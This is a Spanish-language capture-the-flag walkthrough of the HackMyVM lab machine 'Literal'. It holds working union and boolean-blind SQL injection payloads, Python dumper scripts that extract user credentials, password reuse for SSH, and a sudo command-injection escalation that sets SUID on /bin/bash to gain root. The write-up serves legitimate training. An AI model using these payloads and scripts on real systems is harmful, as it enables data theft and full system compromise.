El dia de hoy estaremos resolviendo la maquina literal de la plataforma HackMyVM, el enlace a la maquina lo dejara al final de este articulo.

![](/assets/img/literal/machine.png)

Con arp-scan podemos detectar la ip de la maquina en nuestra red.
```bash
❯ arp-scan -l
Interface: wlp0s20f3, type: EN10MB, MAC: 98:43:fa:84:49:3c, IPv4: 192.168.1.12
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.29	08:00:27:4c:64:e1	PCS Systemtechnik GmbH
192.168.1.252	00:00:ca:01:02:03	ARRIS Group, Inc.
192.168.1.254	cc:75:e2:45:4b:03	ARRIS Group, Inc.
192.168.1.254	cc:75:e2:45:4b:03	ARRIS Group, Inc. (DUP: 2)
```
## Enumeracion
Empezemos enumerando que puertos tiene abiertos la maquina victima.

```bash
❯ nmap 192.168.1.29
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 20:16 -05
Nmap scan report for 192.168.1.29
Host is up (0.00038s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:4C:64:E1 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds
```
Detectemos las versiones y servicios que corren para estos puertos.
```bash
❯ nmap -sCV -p22,80 192.168.1.29 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 20:17 -05
Nmap scan report for 192.168.1.29
Host is up (0.0018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 30ca559468338b5042f4c2b5139966fe (RSA)
|   256 2db05e6b96bd0be314fbe0d058845085 (ECDSA)
|_  256 92d92a5d6f58db8556d60c9968b85964 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://blog.literal.hmv
MAC Address: 08:00:27:4C:64:E1 (Oracle VirtualBox virtual NIC)
Service Info: Host: blog.literal.hmv; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.48 seconds
```
Nmap nos detecte que al momento de acceder a servidor web nos hace un redirect hacia el dominio <span style="color:yellow;"> "blog.literal.hmv"</span>, otra manera de ver esto es tramitando una peticion con curl y viendo las cabezeras de respuesta.
```bash
❯ curl -s 192.168.1.29 -I |grep 'Location'
Location: http://blog.literal.hmv
```
Agregremos el dominio y el subdominio al <span style="color:green;">/etc/hosts</span>.
```bash
❯ echo '192.168.1.29 literal.hmv blog.literal.hmv' >> /etc/hosts
```
Teniendo esto veamos la web.
![](/assets/img/literal/web.png)

Tenemos un panel de login y tambien podemos crear una cuenta.

![](/assets/img/literal/login.png)

Creemos una cuenta he iniciemos session.
![](/assets/img/literal/reg.png)

Nos autenticamos en el login y entramos al dashboard.

![](/assets/img/literal/dash.png)

Si vamos a la seccion de los proyectos, nos muestra esto.

![](/assets/img/literal/que.png)

Tenemos un campo para realizar busquedas, si ponemos un 1 por ejemplo no nos muestra contenido.

![](/assets/img/literal/sql.png)

Si intentamos una inyeccion sql, funciona y nos permite ver de nuevo todos los valores.

![](/assets/img/literal/sqli.png)

La web es vulnerable a sql injection y esto se acontese por que a nivel de codigo no esta haciendo ninguna sanitizacion de nuestro input.

Por detras puede estar jugando con un codigo similar al siguiente.
```bash
select * from users where id = 'User_input';
```
Voy a explicar un poco esto en local.
![](/assets/img/literal/data.png)

Esto no nos devuelve nada ya que no hay ninguna columna en el que el valor de id sea igual al valor de User_input, pero si cerramos la consulta con una <span style="color:red;"> '</span> y le ponemos el operador <span style="color:red;">or</span>, no importa si una de las consultas no es verdadera, con tal de que una de las dos sea correcta nos devolvera todo el contenido de las columnas.

![](/assets/img/literal/local.png)

Esto es igual a lo que se acontese en la web.

## SQL INJECTION
Lo primero es detectar a que tipo de inyeccion sql nos estamos enfrentando, el order by en este punto no nos devolvia ningun error pero podemos enumerar el numero de columnas usando <span style="color:blue;">union select</span>, cuando demos con el numero total de columnas nos deveria mostrar los numeros que seleccionamos en la web (siempre y cuando que la inyeccion sea basada en el error.)

![](/assets/img/literal/4.png)

Con 4 no nos funciona pero si ponemos 5 hay si nos devuelve contenido.
![](/assets/img/literal/5.png)

Atraves de estos numeros que nos reporto podemos dumpear data de la base de datos.

Por ejemplo con <span style="color:blue;">database()</span> nos deberia mostrar el nombre de la base de datos actualmente en uso.

![](/assets/img/literal/db.png)

Para ir dumpeando los datos mas comodos voy a crear un script de python en el cual pueda poner la query y que me muestre los resultados por consola.

```python
#!/usr/bin/python3

import string, pdb, requests, sys, signal, re

def ctrl_c(sig, frame):

    print("\n\n[!] Saliendo.\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, ctrl_c)

# variables
url = 'http://blog.literal.hmv/next_projects_to_do.php'
Burp = {'http':'http://127.0.0.1:8080'}

if len(sys.argv) < 2:
    print("\nUso:\n\tpython3 %s cookie" % sys.argv[0])
    sys.exit(1)

def makeRequest(query):
    
    post_data = {
            "sentence-query":"{}".format(query)
            }

    cookies = {
            "PHPSESSID":sys.argv[1]
            }

    r = requests.post(url, data=post_data, cookies=cookies)
    
    data = re.findall('<td>(.*?)</td><td>(.*?)</td><td>(.*?)</td><td>(.*?)</td><td>(.*?)</td>', r.text)

    return data

def makeInjection():

    while True:

        query = input('> ')
        
        data = makeRequest(query)
        
        output = str(data).replace(')]', '').replace('[(', '')
        
        print(output)

if __name__ == "__main__":
    makeInjection()

```
El modo de uso es muy sencillo simplemente le tenemos que pasar nuestra cookie de autenticacion, que la podemos ver en la web.

![](/assets/img/literal/co.png)

lo ejecutamos y como argumento le pasamos la cookie, voy a utilizar rlwrap para poder tener historico y moverme mas comodo.
```bash
❯ rlwrap python3 sqlBlog.py 'c46861gtraqgl8v86plu9pqmmv'
' union select 1,2,3,database(),5-- -
'1', '2', '3', 'blog', '5'
```
Nos muestra lo mismo que veiamos en la web, ahora veamos cuales son los nombres de todas las bases de datos que existen en este servidor.
```bash
> ' union select 1,2,3,schema_name,5 from information_schema.schemata-- -
'1', '2', '3', 'mysql', '5'), ('1', '2', '3', 'information_schema', '5'), ('1', '2', '3', 'performance_schema', '5'), ('1', '2', '3', 'blog', '5'
```
Si queremos ver todos los nombres juntos y no de se esa forma podemos jugar con <span style="color:blue;">group_concat()</span>, para que toda la informacion nos la reporte en un unico campo.
```bash
> ' union select 1,2,3,group_concat(schema_name),5 from information_schema.schemata-- -
'1', '2', '3', 'mysql,information_schema,performance_schema,blog', '5'
```
Hay vemos la informacion mejor representada, teniendo estos ahora veamos cuales son las tablas existentes en la base de datos blog.
```bash
> ' union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema='blog'-- -
'1', '2', '3', 'projects,users', '5'
```
Vemos una tabla llamada users veamos cuales son sus columnas.
```bash
> ' union select 1,2,3,group_concat(column_name),5 from information_schema.columns where table_schema='blog' and table_name='users'-- -
'1', '2', '3', 'userid,username,userpassword,useremail,usercreatedate', '5'
```
Vemos columnas interesantes veamos el contenido de la columna <span style="color:red;">useremail</span>.
```bash
> ' union select 1,2,3,group_concat(useremail),5 from users-- -
'1', '2', '3', 'test@blog.literal.htb,admin@blog.literal.htb,carlos@blog.literal.htb,freddy123@zeeli.moc,jorg3_M@zeeli.moc,aNdr3s1to@puertonacional.ply,kitty@estadodelarte.moc,walter@forumtesting.literal.hmv,estefy@caselogic.moc,michael@without.you,r1ch4rd@forumtesting.literal.hmv,fel1x@without.you,kelsey@without.you,jtx@tiempoaltiempo.hy,DRphil@alcaldia-tol.gob,carm3N@estadodelarte.moc,lanz@literal.htb,admin@admin.com,test@test.com,admin1@admin.com,probando@test.com,blank@literal.hmv,blank@blank.com', '5'
```
Vemos el contenido pero esta un poco mal representado metamos esto a un archivo y aplicaquemos los saltos de linea correspondientes.

Este es el contenido
```bash
❯ cat data.txt
test@blog.literal.htb
admin@blog.literal.htb
carlos@blog.literal.htb
freddy123@zeeli.moc
jorg3_M@zeeli.moc
aNdr3s1to@puertonacional.ply
kitty@estadodelarte.moc
walter@forumtesting.literal.hmv
estefy@caselogic.moc
michael@without.you
r1ch4rd@forumtesting.literal.hmv
fel1x@without.you
kelsey@without.you
jtx@tiempoaltiempo.hy
DRphil@alcaldia-tol.gob
carm3N@estadodelarte.moc
lanz@literal.htb
admin@admin.com
test@test.com
admin1@admin.com
probando@test.com
blank@blank.com
```

En estos correos vemos algo interesante otro subdominio <span style="color:yellow;">forumtesting.literal.hmv</span> agreguemoslo al <span style="color:green;">/etc/hosts</span>

```bash
❯ echo '192.168.1.29 forumtesting.literal.hmv' >> /etc/hosts
```
Accedamos a este subdominio para ver si la web es diferente.
![](/assets/img/literal/sub.png)
El contenido de la web es diferente por lo que tenemos algo mas para enumerar.

Si vemos los detalles del foro.
![](/assets/img/literal/det.png)
Nos redirije a esta seccion de la web.
![](/assets/img/literal/id.png)
Lo mas interesante de esto lo vemos en la url atraves del parametro <span style="color:red;">category_id</span> lo esta igualando a el valor de 2.

Si probamos nuevamente la inyeccion sql que aplicamos antes, el contenido de la web desaparece.
![](/assets/img/literal/blind.png)

Como es un numero puede ser que lo este recibiendo como un entero por ende no lo esta englobando entre comillas, pobremos quitando la comilla simple.
![](/assets/img/literal/comi.png)
De esta manera si funciona, y nos devuelve un contenido diferente en esta seccion.

Antes
![](/assets/img/literal/antes.png)

Despues
![](/assets/img/literal/despues.png)

Vale esta vez si intentamos dumpear los datos como lo hicimos anteriormente no nos va a funcionar ya que en esta web la inyeccion sql es diferente.

## boolean-based blind SQL injection

Que son las inyecciones boolean-based blind SQL injection?

En este tipo de inyecciones no podemos ver ningun error en la respuesta si no que dependiendo si la consulta devuelve un falso o un verdadero nos muestra una palabra o frase distinta o por el contrario la quita, por ejemplo si ponemos una consulta que es verdadera nos muestra un mensaje.
```bash
1 and 1=1 # Verdadero
```

![](/assets/img/literal/boo.png)

Si ponemos una consulta que no es verdadera el mensaje desaparece.
```bash
1 and 2=1 # Falso
```
![](/assets/img/literal/desa.png)

Por tanto ya tenemos una via atraves de la cual ir dumpeando los datos que nos interesen.

Para toda la inyeccion voy a crear un script de python que se encargue de dumpearme los datos, el cual en base a lo que queramos dumpear tenemos que ir modificando.

Este se va a encargar de dumpearme el nombre de la base de datos actualmente en uso.

```python
#!/usr/bin/python3

import signal, time, requests, string
from pwn import *

def ctrl_c(sig, frame):

    print("\n\n[!] Saliendo.\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, ctrl_c)

# Variables
url = 'http://forumtesting.literal.hmv/category.php?category_id='
characters = string.ascii_lowercase + string.digits + '_-'

def makeRequest():
    
    database = ''
    
    l1 = log.progress('Aplicando fuerza Bruta :')
    
    l2 = log.progress('Database:')

    lengt = 20

    for position in range(1,20):

        for character in characters:
            

            payload = "1 and if(substring(database(),%d,1)='%c',sleep(0),1)" % (position, character)

            l1.status('Probando con el caracter {} [{}/{}]'.format(character, position, lengt))
            
            main_url = url + payload
            
            r = requests.get(main_url)
            
            if 'New things' not in r.text:
                database += character
                l2.status(database)
                break

if __name__ == "__main__":
    makeRequest()
```
Hay podemos ver el nombre de la base de datos actualmente en uso.
```bash
❯ python3 sqlI.py
[◓] Aplicando fuerza Bruta :: Probando con el caracter - [19/20]
[◓] Database:: forumtesting
```
Tenemos el nombre de la base de datos, ahora para el nombre de las tablas tenemos que que agregar otro iterrador, por lo que seria un triple bucle anidado, simplemente va a cambiar el contenido la funcion  <span style="color:yellow;">makeRequest()</span>
```bash
def makeRequest():
    
    tables = ''
    
    l1 = log.progress('Aplicando fuerza Bruta :')
    
    l2 = log.progress('tables:')

    lengt = 20

    for limit in range(0,6):

        for position in range(1,20):

            for character in characters:
                

                payload = "1 and if(substring((select table_name from information_schema.tables where table_schema='forumtesting' limit %d,1),%d,1)='%c', sleep(0),1)" % (limit, position, character)

                l1.status('Probando con el caracter {} [{}/{}] [{}/5]'.format(character, position, lengt, limit))
                
                main_url = url + payload
                
                r = requests.get(main_url)
                
                if 'New things' not in r.text:
                    tables += character
                    l2.status(tables)
                    break
            
        tables += ', '
```        

Lo ejecutamos y obtenemos los nombres de las tablas.
```bash
❯ python3 sqlTables.py
[←] Aplicando fuerza Bruta :: Probando con el caracter - [19/20] [5/5]
[|] tables:: forum_category, forum_owner, forum_posts, forum_topics, forum_users
```
Teniendo los nombres de las tablas podemos pasar a el nombre de las columnas voy a dumpear las columnas para la tabla <span style="color:green;">forum_owner</span> , para esto simplemente va a cambiar el contenido de la variable <span style="color:green;">payload</span> por el siguiente contenido.
```bash
payload = "1 and if(substring((select column_name from information_schema.columns where table_schema='forumtesting' and table_name='forum_owner' limit %d,1),%d,1)='%c', sleep(0),1)" % (limit, position, character)
 ```
Una vez sustituido el valor de la variable payload por este nuevo lo volvemos a ejecutar.
```bash
❯ python3 sqlColumns.py
[▇] Aplicando fuerza Bruta : 1 and if(substring((select column_name from information_schema.columns where table_schema='forumtesting' and table_name='forum_owner' limit 9,1),15,1)='-', sleep(0),1)
[<] columns: created, email, id, password, username
```
Bueno ahora simplemente tenemos que dumpear los datos de las columnas username y password.

El script final quedaria asi.
```bash
#!/usr/bin/python3

import signal, time, requests, string
from pwn import *

def ctrl_c(sig, frame):

    print("\n\n[!] Saliendo.\n")
    sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, ctrl_c)

# Variables
url = 'http://forumtesting.literal.hmv/category.php?category_id='
characters = string.ascii_lowercase + string.digits + '$/:'

def makeRequest():
    
    credentials = ''
    
    l1 = log.progress('Aplicando fuerza Bruta ')
    
    l2 = log.progress('columns')

    lengt = 20

    for position in range(1,150):

        for character in characters:
            
            payload = "1 and if(substring((select group_concat(username,0x3a,password) from forum_owner),%d,1)='%c', sleep(0),1)" % (position, character)

            l1.status(payload)
            
            main_url = url + payload
            
            r = requests.get(main_url)
            
            if 'New things' not in r.text:
                credentials += character
                l2.status(credentials)
                break

if __name__ == "__main__":
    makeRequest()
```
Lo ejecutamos y nos dumpea el usuario y una contraseña que esta encryptada.
```bash
❯ python3 sqlDumper.py
[ ] Aplicando fuerza Bruta : 1 and if(substring((select group_concat(username,0x3a,password) from forum_owner),149,1)=':', sleep(0),1)
[┐] columns: carlos:6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99
```

## Intrusion
Podemos ir a [Crackstation](https://crackstation.net/) y pasarle el hash para ver si esta en el diccionario que emplean.

![](/assets/img/literal/decryp.png) 

Bueno obtenemos una contraseña en texto claro, esta contraseña no nos va a servir para loguernos en ningun servicio pero si le prestamos atencion a la contraseña esta referenciando forum que es subdomonio y un numero, y si hay una similitud en la contraseña y lo unico que cambia es el nombre del servicio?, por ejemplo la misma contraseña pero en ves de forum le ponemos ssh?.

Si lo probamos nos funciona y obtenemos acceso a la maquina.

```bash
❯ sshpass -p 'ssh100889' ssh carlos@192.168.1.8
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-150-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 07 Jun 2023 11:24:07 PM UTC

  System load:             0.23
  Usage of /:              22.4% of 33.99GB
  Memory usage:            78%
  Swap usage:              7%
  Processes:               113
  Users logged in:         0
  IPv4 address for enp0s3: 192.168.1.8
  IPv6 address for enp0s3: 2800:e2:2580:437:a00:27ff:fe4c:64e1


148 updates can be installed immediately.
2 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jun  7 01:43:02 2023 from 192.168.1.12
-bash-5.0$ id
uid=1000(carlos) gid=1000(carlos) groups=1000(carlos)
-bash-5.0$ 
```

## Escalada De Privilegios

Si vemos los privilegios que tenemos a nivel de sudoers podemos ejecutar un script de python como root y pasarle cualquier argumento.

```bash
-bash-5.0$ sudo -l
Matching Defaults entries for carlos on literal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on literal:
    (root) NOPASSWD: /opt/my_things/blog/update_project_status.py *
```
Este es el contenido del script de python
```bash
#!/usr/bin/python3

# Learning python3 to update my project status
## (mental note: This is important, so administrator is my safe to avoid upgrading records by mistake) :P

'''
References:
* MySQL commands in Linux: https://www.shellhacks.com/mysql-run-query-bash-script-linux-command-line/
* Shell commands in Python: https://stackabuse.com/executing-shell-commands-with-python/
* Functions: https://www.tutorialspoint.com/python3/python_functions.htm
* Arguments: https://www.knowledgehut.com/blog/programming/sys-argv-python-examples
* Array validation: https://stackoverflow.com/questions/7571635/fastest-way-to-check-if-a-value-exists-in-a-list
* Valid if root is running the script: https://stackoverflow.com/questions/2806897/what-is-the-best-way-for-checking-if-the-user-of-a-script-has-root-like-privileg
'''

import os, pdb
import sys
from datetime import date

# Functions ------------------------------------------------.
def execute_query(sql):
    pdb.set_trace()
    os.system("mysql -u " + db_user + " -D " + db_name + " -e \"" + sql + "\"")

# Query all rows
def query_all():
    sql = "SELECT * FROM projects;"
    execute_query(sql)

# Query row by ID
def query_by_id(arg_project_id):
    sql = "SELECT * FROM projects WHERE proid = " + arg_project_id + ";"
    execute_query(sql)

# Update database
def update_status(enddate, arg_project_id, arg_project_status):
    if enddate != 0:
        sql = f"UPDATE projects SET prodateend = '" + str(enddate) + "', prostatus = '" + arg_project_status + "' WHERE proid = '" + arg_project_id + "';"
    else:
        sql = f"UPDATE projects SET prodateend = '2222-12-12', prostatus = '" + arg_project_status + "' WHERE proid = '" + arg_project_id + "';"

    execute_query(sql)

# Main program
def main():
    # Fast validation
    try:
        arg_project_id = sys.argv[1]
    except:
        arg_project_id = ""

    try:
        arg_project_status = sys.argv[2]
    except:
        arg_project_status = ""

    if arg_project_id and arg_project_status: # To update
        # Avoid update by error
        if os.geteuid() == 0:
            array_status = ["Done", "Doing", "To do"]
            if arg_project_status in array_status:
                print("[+] Before update project (" + arg_project_id + ")\n")
                query_by_id(arg_project_id)

                if arg_project_status == 'Done':
                    update_status(date.today(), arg_project_id, arg_project_status)
                else:
                    update_status(0, arg_project_id, arg_project_status)
            else:
                print("Bro, avoid a fail: Done - Doing - To do")
                exit(1)

            print("\n[+] New status of project (" + arg_project_id + ")\n")
            query_by_id(arg_project_id)
        else:
            print("Ejejeeey, avoid mistakes!")
            exit(1)

    elif arg_project_id:
        query_by_id(arg_project_id)
    else:
        query_all()

# Variables ------------------------------------------------.
db_user = "carlos"
db_name = "blog"

# Main program
main()
```
Este script es para ver los proyectos en la base de datos.

 en esta parte del codigo define que va hacer el programa cuando recibe o no recibe argumentos, cuando recibe un argumento llama a la funcion <span style="color:green;">query_by_id()</span> y le pasa valor de nuestro argumento, cuando la funcion no recibe ningun argumento llama a la funcion <span style="color:green;">query_all()</span>.
```bash
elif arg_project_id:
    query_by_id(arg_project_id)
else:
    query_all()
```        
La funcion <span style="color:green;">query_by_id()</span>, define una query de mysql y le agrega nuestro input y despues llama la funcion <span style="color:green;">execute_query()</span> a la cual le pasa el valor de la variable <span style="color:purple;">sql</span>
```bash
def query_by_id(arg_project_id):
    sql = "SELECT * FROM projects WHERE proid = " + arg_project_id + ";"
    execute_query(sql)
```

La funcion <span style="color:green;">query_all()</span>, define tambien una query de mysql pero en este caso esta seleccionando todo el contendio de la columna <span style="color:green;">projects</span>.

En la funcion <span style="color:green;">query_by_id()</span>, estaba llamando a otra funcion <span style="color:green;">execute_query()</span>, la funcion es la siguiente.
```bash
def execute_query(sql):
    pdb.set_trace()
    os.system("mysql -u " + db_user + " -D " + db_name + " -e \"" + sql + "\"")
```
En esta funcion tenemos un punto de inyeccion ya que esta tomando el valor de la variable <span style="color:purple;">sql</span> (en la cual podemos introducir contenido) y la esta ejecutando a nivel de sistema,  en <span style="color:purple;">arg_project_id</span> es donde va nuestro input, ademas el programa no realiza ningun tipo de validacion que nos inpida poner caracteres especiales.
```bash
sql = "SELECT * FROM projects WHERE proid = " + arg_project_id + ";"
```
Si ejecutamos el programa sin pasarle ningun argumento nos muestra todo el contenido de las columnas.
```bash
-bash-5.0$ /opt/my_things/blog/update_project_status.py
+-------+--------------------------------------------------------------+---------------------+------------+-----------+
| proid | proname                                                      | prodatecreated      | prodateend | prostatus |
+-------+--------------------------------------------------------------+---------------------+------------+-----------+
|     1 | Ascii Art Python - ABCdario with colors                      | 2021-09-20 17:51:59 | 2021-09-20 | Done      |
|     2 | Ascii Art Python - Show logos only with letter A             | 2021-09-20 18:06:22 | 2222-12-12 | To do     |
|     3 | Ascii Art Bash - Show musical stores (WTF)                   | 2021-09-20 18:06:50 | 2222-12-12 | To do     |
|     4 | Forum - Add that people can send me bug reports of projects  | 2023-04-07 17:40:41 | 2023-11-01 | Doing     |
|     5 | Validate syntax errors on blog pages                         | 2021-09-20 18:07:43 | 2222-12-12 | Doing     |
|     6 | Script to extract info from files and upload it to any DB    | 2021-09-20 18:07:58 | 2222-12-12 | Doing     |
|     7 | Forum - Implement forum form                                 | 2023-04-07 17:46:38 | 2023-11-01 | Doing     |
|     8 | Add that people can create their own projects on DB          | 2021-09-20 18:49:52 | 2222-12-12 | To do     |
|     9 | Ascii Art C - Start learning Ascii Art with C                | 2021-09-20 18:50:02 | 2222-12-12 | To do     |
|    10 | Ascii Art Bash - Welcome banner preview in blog home         | 2021-09-20 18:50:08 | 2222-12-12 | To do     |
|    11 | Blog - Create login and register form                        | 2023-04-07 17:40:28 | 2023-08-21 | Done      |
|    12 | Blog - Improve the appearance of the dashboard/projects page | 2021-09-20 18:50:18 | 2222-12-12 | Doing     |
+-------+--------------------------------------------------------------+---------------------+------------+-----------+
-bash-5.0$ 
```
Si le pasamos como argumento el numero 1 nos muestra una sola fila, ya que en esta parte del codigo esta filtrando por nuestro input.
```bash
sql = "SELECT * FROM projects WHERE proid = " + arg_project_id + ";"
```
Lo ejecutamos.
```bash
-bash-5.0$ /opt/my_things/blog/update_project_status.py '1'
+-------+-----------------------------------------+---------------------+------------+-----------+
| proid | proname                                 | prodatecreated      | prodateend | prostatus |
+-------+-----------------------------------------+---------------------+------------+-----------+
|     1 | Ascii Art Python - ABCdario with colors | 2021-09-20 17:51:59 | 2021-09-20 | Done      |
+-------+-----------------------------------------+---------------------+------------+-----------+
-bash-5.0$ 
```
Si le pasamos de argumento algo que no exista en la base de datos nos da un error.
```bash
-bash-5.0$ /opt/my_things/blog/update_project_status.py 'probando'
ERROR 1054 (42S22) at line 1: Unknown column 'probando' in 'where clause'
-bash-5.0$ 
```
Para poder injectar comandos podemos hacerlo de dos formas jugando con el <span style="color:red;">$()</span> o jugando con las <span style="color:red;">``</span>.

Ahora lo ejecutamos pero como argumento le pasamos <span style="color:red;">'`id`'</span>.

```bash
-bash-5.0$ sudo /opt/my_things/blog/update_project_status.py '`id`'
ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(root) gid=0(root) groups=0(root)' at line 1
-bash-5.0$ 
```
En el mensaje de error nos muestra el output del comandos id, ahora simplemente le voy a dar privilegios suid a la bash para poder lanzarme una consola como el propietario(root) temporalmente, lo ejecutamos.

```bash
-bash-5.0$ sudo /opt/my_things/blog/update_project_status.py '`chmod u+s /bin/bash`'
ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
-bash-5.0$ 
```
Ahora si vemos los privilegios de la bash es suid
```bash
-bash-5.0$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
-bash-5.0$ 
```
Ahora simplemente ejecutamos la bash y le pasamos el parametro -p que es para que haga alucion a el propietario(root).
```bash
-bash-5.0$ bash -p
bash-5.0# whoami
root
bash-5.0# 
```
Gracias por leer!


Enlace a la maquina [literal.ova](https://drive.google.com/file/d/1UaZiOpnV8svCQKX3G5Tklxpnp9Ip_ajb/view)

